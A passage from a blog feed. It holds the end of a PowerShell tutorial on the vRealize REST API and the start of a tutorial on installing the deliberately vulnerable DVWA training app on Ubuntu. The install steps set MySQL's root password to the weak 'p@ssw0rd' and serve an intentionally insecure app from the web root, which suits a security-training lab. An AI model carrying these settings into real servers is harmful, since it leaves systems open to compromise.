&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$bearer_token&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, we will use the &lt;code class=&quot;language-text&quot;&gt;Invoke-RestMethod&lt;/code&gt; again. However, this time we will specify a &lt;code class=&quot;language-text&quot;&gt;-Method Get&lt;/code&gt; because we are &lt;em&gt;getting&lt;/em&gt; information from the vRealize server.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$entitled_blueprints&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;Invoke-RestMethod&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Method Get &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Uri &lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Headers &lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is very similar to the previous &lt;code class=&quot;language-text&quot;&gt;Invoke-RestMethod&lt;/code&gt; that we used. This time we &lt;em&gt;get&lt;/em&gt; data from the &lt;code class=&quot;language-text&quot;&gt;entitledCatalogItemViews&lt;/code&gt; API with the specified headers - including the bearer token. We save the resultant output in the variable named &lt;code class=&quot;language-text&quot;&gt;$entitled_blueprints&lt;/code&gt;. The information we get back is exceptionally useful and forms the basis of automated requesting of Blueprints in vRealize.&lt;/p&gt;
&lt;p&gt;Finally, we will loop through the JSON object that was returned and simply print the name of the vRealize blueprints we have access to. This is easily achieved using the following loop. Note how we use &lt;code class=&quot;language-text&quot;&gt;$entitled_blueprints.content&lt;/code&gt;. This structure is an array of each Blueprint available.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&gt;&gt;&gt; Found the following vRealize Deployments...&quot;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;ForEach&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$blueprint&lt;/span&gt; in &lt;span class=&quot;token variable&quot;&gt;$entitled_blueprints&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;content&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;  &gt;&quot;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$blueprint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;name
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The script should print out something similar to the output below. I just made up the virtual machine names to provide an example.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&gt;&gt;&gt; Found the following vRealize Deployments...
  &gt; Ubuntu_WebServer
  &gt; Ubuntu-Server-Docker
  &gt; Windows-Server-2016
  &gt; CentOS-BaseInstall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From here we could perform tasks like request a blueprint to be deployed. Very nice! To get an idea of the information available I have included a full JSON object for one vRealize deployment. As you can see the information is very detailed. Moreover, the information is highly useful when &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;@type&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;ConsumerEntitledCatalogItemView&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;entitledOrganizations&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
                                    &lt;span class=&quot;token string&quot;&gt;&quot;@{tenantRef=vsphere.local; tenantLabel=vsphere.local; subtenantRef=cb222bf4-7f3d-4a51-b94a-62fcfecece3b; subtenantLabel=WORK_BG}&quot;&lt;/span&gt;
                                &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;catalogItemId&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;56588c8c-f593-4546-8854-b7f56c879771&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;Linux-TrainingVM&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;A Training VM for Linux.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;isNoteworthy&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;dateCreated&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;2018-07-12T19:36:50.981Z&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;lastUpdatedDate&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;2018-07-12T23:17:09.098Z&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;links&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
                    &quot;@&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;@type=link; rel=GET&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Request Template; href=https&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//vra01.corp.local/catalog-service/api/consumer/entitledCatalogItems/5658ac8c-f593-4546-8854-b7f5d4879771/r&lt;/span&gt;
equests/template&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;?businessGroupId&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;requestedFor&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&quot;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                    &quot;@&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;@type=link; rel=POST&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; Submit Request; href=https&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;//vra01.corp.local/catalog-service/api/consumer/entitledCatalogItems/5658ac8c-f593-4546-8854-b7f56ce39771/re&lt;/span&gt;
quests&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;?businessGroupId&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;requestedFor&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&quot;
                &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;iconId&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;composition.blueprint.png&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;catalogItemTypeRef&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;token property&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;com.vmware.csp.component.cafe.composition.blueprint&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                                &lt;span class=&quot;token property&quot;&gt;&quot;label&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;Composite Blueprint&quot;&lt;/span&gt;
                            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;serviceRef&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;token property&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;f8e4c658-24d1-4af0-ab58-04e991b143ae&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                        &lt;span class=&quot;token property&quot;&gt;&quot;label&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;Linux&quot;&lt;/span&gt;
                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;&quot;outputResourceTypeRef&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
                                    &lt;span class=&quot;token property&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;composition.resource.type.deployment&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;token property&quot;&gt;&quot;label&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;token string&quot;&gt;&quot;Deployment&quot;&lt;/span&gt;
                                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To give you some ideas of what you can do with this information here are some examples and discussion. You can select a specific Blueprint from the JSON array using the index number. For example, the Blueprint I wanted to view information about is indexed at &lt;code class=&quot;language-text&quot;&gt;10&lt;/code&gt;, so I can use the following code to print only the JSON object for that Blueprint:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$entitled_blueprints&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;content&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;10&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After knowing the Blueprint index, you could determine the URL needed to request the template using the following code:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$entitled_blueprints&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;content&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;10&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;links&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;href&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There are two links provided, one for requesting a template (index &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;) and one for submitting a request (index &lt;code class=&quot;language-text&quot;&gt;1&lt;/code&gt;). I know, this is getting a little messy, but you would not usually be dynamically determining this information in a script… Rather you would query the REST API for the URL manually, then write a script to automate multiple Blueprint requests. &lt;/p&gt;
&lt;p&gt;The best method to learn how to use the information returned by the REST API is to dynamically program and test things in PowerShell. This is one of the great benefits of using PowerShell for this type of problem. Also, there is pretty good documentation provided on the vRealize server available at the following URL (make sure to change the domain name &lt;code class=&quot;language-text&quot;&gt;vra01.corp.local&lt;/code&gt; to the actual address of your vRealize server).&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;https://vra01.corp.local/component-registry/services/docs&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;On this vRealize hosted site you can view the documentation for the vRealize REST API and all of the functions and features provided. &lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This post covered how to connect to a vRealize REST API using Windows PowerShell and print information about vRealize Blueprints. This was a revelation to myself and will definitely make my life easier. Please leave a comment if you have any questions or feedback. Also, please let me know if this was useful, as I might continue this post with a series about common tasks that can be automated using the vRealize REST API… using PowerShell, of course!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Installing and Configuring DVWA]]></title><description><![CDATA[This tutorial covers how to install and configure the Damn Vulnerable Web Application, or DVWA.  Contents Introduction Initial Steps…]]></description><link>https://thomaslaurenson.com/blog/2018-07-12/installing-and-configuring-DVWA/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-12/installing-and-configuring-DVWA/</guid><pubDate>Thu, 12 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This tutorial covers how to install and configure the &lt;a href=&quot;https://github.com/ethicalhack3r/DVWA&quot;&gt;Damn Vulnerable Web Application&lt;/a&gt;, or DVWA. &lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#initial-steps&quot;&gt;Initial Steps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configuring-dvwa&quot;&gt;Configuring DVWA&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#re-configure-mysql-root-account&quot;&gt;Re-configure MySQL root account&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#creating-the-dvwa-database&quot;&gt;Creating the DVWA Database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;The authors summarize DVWA as:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students &amp;#x26; teachers to learn about web application security in a controlled classroom environment.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This tutorial assumes you have a working install of Ubuntu Server version 18.04. This install can be on a physical machine, but most likely you will be using a virtual machine. When I installed and configured DVWA, I was using Ubuntu Server version 18.04 amd64. I also tested the install on Ubuntu Desktop version 18.04 amd64. Both worked using the same set of steps.&lt;/p&gt;
&lt;h2 id=&quot;initial-steps&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#initial-steps&quot; aria-label=&quot;initial steps permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Initial Steps&lt;/h2&gt;
&lt;p&gt;Make sure your Ubuntu system is up-to-date by checking and downloading any new packages:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt update &amp;&amp; sudo apt upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Download the required packages to install DVWA:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When you install MySQL you might be prompted to enter a password for the root account. If you are, use the password: &lt;code class=&quot;language-text&quot;&gt;p@ssw0rd&lt;/code&gt;. This is the password that DVWA is configured for, and it makes life easier to not change the configuration. However, if you are not prompted to enter a password for the root account, it is most likely that you are using MySQL version 5.7 or above. In this case, there is a fix described further below in this post.&lt;/p&gt;
&lt;p&gt;The above command to install the required packages does not specify what specific versions of the packages to download, so you will end up with the latest PHP and MySQL versions. The specific versions I installed were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;php&lt;/code&gt;: &lt;code class=&quot;language-text&quot;&gt;php7.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;mysql-server&lt;/code&gt;: &lt;code class=&quot;language-text&quot;&gt;mysql-server-5.7&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We are now going to download DVWA from their GitHub repository. You can browse this repository using the following &lt;a href=&quot;https://github.com/ethicalhack3r/DVWA&quot;&gt;link&lt;/a&gt;. First, we should make sure we are in the home directory of the current Linux user:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We are going to use the &lt;code class=&quot;language-text&quot;&gt;git&lt;/code&gt; command, to download the DVWA repository. Use the following command to clone the latest version of DVWA from GitHub:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git clone --recursive https://github.com/ethicalhack3r/DVWA.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The command above will download all the required DVWA source code files. Specifically, &lt;code class=&quot;language-text&quot;&gt;git&lt;/code&gt; will create a new directory in your home directory called &lt;code class=&quot;language-text&quot;&gt;DVWA&lt;/code&gt;. This directory will contain all the source code required to setup DVWA.&lt;/p&gt;
&lt;p&gt;For the sake of complete documentation: the specific version of DVWA I used during my install is indicated by the following git object name: &lt;code class=&quot;language-text&quot;&gt;e39ff4f&lt;/code&gt;. If you want to clone this specific version, you can &lt;em&gt;reset&lt;/em&gt; the downloaded git repository, so you get this exact version. This step is not essential. But you can set the downloaded repository to the same version as used in this tutorial using the following command: &lt;code class=&quot;language-text&quot;&gt;git reset --hard e39ff4f&lt;/code&gt;. Note: you must be in the DVWA directory you downloaded to run this command.&lt;/p&gt;
&lt;p&gt;Since we are installing DVWA on the Apache web server, we should remove the default index file (&lt;code class=&quot;language-text&quot;&gt;index.html&lt;/code&gt;) that is created when Apache is installed. Doing this will make way for the new index page (&lt;code class=&quot;language-text&quot;&gt;index.php&lt;/code&gt;) provided by DVWA. Remove the default Apache index page provided by DVWA using the following command.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo rm /var/www/html/index.html&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we want to copy the entire DVWA directory and contents to the &lt;code class=&quot;language-text&quot;&gt;/var/www/html/&lt;/code&gt; directory. This is the directory that Apache uses to &lt;em&gt;serve&lt;/em&gt; web pages to users. Anything in this folder will be available from the server. Please note, we are not putting DVWA in a folder in the &lt;code class=&quot;language-text&quot;&gt;/var/www/html&lt;/code&gt; directory, only the &lt;code class=&quot;language-text&quot;&gt;DVWA&lt;/code&gt; folder contents. This way, you do not have to use &lt;code class=&quot;language-text&quot;&gt;DVWA&lt;/code&gt; in the URL. Basically, I did this for simplicity.&lt;/p&gt;
&lt;p&gt;The following command assumes you downloaded DVWA (using &lt;code class=&quot;language-text&quot;&gt;git&lt;/code&gt;) into your home directory. I would recommend making sure that DVWA downloaded correctly by checking the contents of this directory; for example, &lt;code class=&quot;language-text&quot;&gt;cd ~/DVWA&lt;/code&gt; and then &lt;code class=&quot;language-text&quot;&gt;ls -la&lt;/code&gt;. You should see all the DVWA source code files.&lt;/p&gt;
&lt;p&gt;When you are happy to proceed, copy all the DVWA files that you downloaded to the &lt;code class=&quot;language-text&quot;&gt;/var/www/html/&lt;/code&gt; directory using the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo cp -r ~/DVWA/* /var/www/html/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Change to the web server directory:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd /var/www/html&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It would be prudent to make sure that all the DVWA files have been copied across. You can check by listing the &lt;code class=&quot;language-text&quot;&gt;html&lt;/code&gt; directory using &lt;code class=&quot;language-text&quot;&gt;ls -la /var/www/html&lt;/code&gt; and you should see output similar to the listing below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;student@ubuntu:/var/www/html$ ls -la /var/www/html
total 148
drwxr-xr-x  8 root root  4096 Jul 11 12:58 .
drwxr-xr-x  3 root root  4096 Jul 11 12:54 ..
-rw-r--r--  1 root root  3798 Jul 11 12:58 about.php
-rw-r--r--  1 root root  7296 Jul 11 12:58 CHANGELOG.md
drwxr-xr-x  2 root root  4096 Jul 11 12:58 config
-rw-r--r--  1 root root 33107 Jul 11 12:58 COPYING.txt
drwxr-xr-x  2 root root  4096 Jul 11 12:58 docs
drwxr-xr-x  6 root root  4096 Jul 11 12:58 dvwa
drwxr-xr-x  4 root root  4096 Jul 11 12:58 external
-rw-r--r--  1 root root  1406 Jul 11 12:58 favicon.ico
